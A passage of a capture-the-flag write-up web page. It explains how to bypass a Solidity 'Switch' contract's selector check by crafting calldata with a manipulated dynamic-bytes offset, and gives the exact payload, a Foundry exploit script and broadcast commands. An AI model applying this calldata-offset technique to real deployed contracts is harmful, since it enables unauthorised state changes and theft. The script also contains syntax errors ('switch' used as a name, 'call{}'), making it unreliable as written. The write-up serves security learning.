    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success,) = address(this).call(_data);
        require(success, "call failed");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }
}
</code>
</pre>
                    </div>

                    <div>
                        <h5>>> Goal :</h5>
                        <span>
                            <ul>
                                <li>
                                    Just have to flip the switch. Can't be that hard, right?
                                </li>
                            </ul>
                        </span>

                        <h5>>> Solution : </h5>
                        <ul>
                            <li>
                                To update switch variable we have three functions named <b>turnSwitchOn(),
                                    turnSwitchOff()</b>
                                and <b>flipSwitch()</b>.
                            </li>
                            <li>
                                By using this <b>flipSwitch()</b> only we have to call the turnSwitchOn() function. For
                                this we
                                need to pass the calldata for the function call <b>turnSwitchOn()</b>.
                            </li>
                            <li>
                                The onlyOff modifier uses an inline assembly code block with the calldatacopy command.
                                The calldatacopy command is used to copy
                                input data from calldata to memory.
                            </li>
                            <li>The first parameter of the function indicates the memory storage location, the second
                                one is used to set the offset in calldata to copy from and the final parameter defines
                                the size of the data to copy. In our case this is: <b>selector, 68, 4</b>
                            </li>
                            <li>
                                The modifier checks if the value copied to the <b>first</b> index of the selector array
                                is
                                equal to the function selector of the <b>turnSwitchOff()</b> function.
                            </li>
                            <li>
                                In order to hack the contract we will use the call method and send calldata that has
                                three different function selectors:
                                <div class="repo">
                                    <pre>
function flipSwitch(bytes memory _data) — 0x30c13ade
turnSwitchOff() — 0x20606e15
turnSwitchOn() — 0x76227e12
</pre>
                                </div>
                            </li>
                            <li>
                                After we have our function selector values we can setup the calldata,
                                from inspecting our contract, we can see that the <b>onlyOff()</b> modifier requires
                                that our
                                calldata has the value <b>0x20606e15</b> at an offset of 64 bytes.
                            </li>
                            <div class="repo">
                                <pre>
       0x30c13ade                                                        => flipSwitch() function selector
0x00 : 0000000000000000000000000000000000000000000000000000000000000060  => offset - the starting position of the actual data
0x20 : 0000000000000000000000000000000000000000000000000000000000000000
0x40 : 0000000000000000000000000000000000000000000000000000000000000004  => length - data length
0x60 : 20606e1500000000000000000000000000000000000000000000000000000000  => trunSwitchOff() function selector
0x80 : 0000000000000000000000000000000000000000000000000000000000000004  => Length of the turnSwitchOff() signature data
0xa0 : 76227e1200000000000000000000000000000000000000000000000000000000  => actual execution of calldata - turnSwitchOn() selector
</pre>
                            </div>
                            <li>
                                The main part here that we had to figure out is that we can manually choose an offset
                                value for the beginning of our “real” calldata, and input anything we want in between.
                                That means that we can put the actual _data parameter value that is being used at an
                                offset of <b>96 (4 bytes for function selector + 92 bytes for signature data)</b> bytes
                                (storing the length of the bytes and then the actual value),
                                and
                                still have the value <b>0x20606e15</b> at an offset of <b>64</b> bytes.
                            </li>
                            <li>
                                Now this calldata will bypasses the check of onlyOff and we modified the offset to point
                                it to the <b>turnSwitchOn()</b> signature.
                            </li>
                            <li>
                                This should successfully change the switchOn variable to true.
                            </li>
                        </ul>
                    </div>
                    <br>

                    <span id="levelBox">SwitchSolve.s.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Switch} from "../src/Switch.sol";

contract SwitchSolve is Script {
    Switch public switch = Switch(0xf97EEDfFe70bFa579DbB26FD8Dd469F00ea9071f);

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Switch  : ", switch.switchOn());

        bytes memory data = 0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000;

        console.logBytes(data);

        address(switch).call{}(data);

        console.log("Switch  : ", switch.switchOn());
        vm.stopBroadcast();
    }
}
</code>
                </pre>
                    </div>

                    <h5>>> Run script : </h5>
                    <div class="repo">
                        <span>$ source .env</span><br>
                        <span>$ forge script script/SwitchSolve.s.sol:SwitchSolve --rpc-url $RPC_URL
                            --broadcast</span>
                    </div>
                </div>
                <hr class="breakLine">

                <!-- References -->
                <div>
                    <h3>>> Reference</h3>
                    <ul>
                        <li>
                            <a href="https://docs.soliditylang.org/en/latest/" target="_blank">Solidity
                                documentation</a>
                        </li>
                        <li>
                            <a href="https://github.com/x676f64/secureum-mind_map" target="_blank">Secureum mind map</a>
                        </li>
                        <li>
                            <a href="https://github.com/foundry-rs/foundry" target="_blank">Foundry</a>
                        </li>
                        <li>
                            <a href="https://swcregistry.io/" target="_blank">SWC Registry</a>
                        </li>
                        <li>
                            <a href="https://github.com/Quillhash/Solidity-Attack-Vectors" target="_blank"> Solidity
                                attack vecors</a>
                        </li>
                    </ul>
                </div>

            </div>
            <!-- Footer -->
            <footer id="footer">
                <div class="container">
                    <div class="copyright">
                        <strong><span>Fund Me</span></strong>
                    </div>
                    <div class="credits">
                        <a href="#" style="font-size: 10px;">0xd0509B83468409A75De2771C1Ae7bE1026A69927</a>
                    </div>
                </div>
            </footer>

            <!-- Scripts imports -->
            <div>
                <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i
                        class="bi bi-arrow-up-short"></i></a>

                <!-- Vendor JS Files -->
                <script src="../assets/vendor/purecounter/purecounter_vanilla.js"></script>
                <script src="../assets/vendor/aos/aos.js"></script>
                <script src="../assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
                <script src="../assets/vendor/glightbox/js/glightbox.min.js"></script>
                <script src="../assets/vendor/isotope-layout/isotope.pkgd.min.js"></script>
                <script src="../assets/vendor/swiper/swiper-bundle.min.js"></script>
                <script src="../assets/vendor/typed.js/typed.umd.js"></script>
                <script src="../assets/vendor/waypoints/noframework.waypoints.js"></script>
                <script src="../assets/vendor/php-email-form/validate.js"></script>

                <!-- Template Main JS File -->
                <script src="../assets/js/main.js"></script>
            </div>
</body>

</html>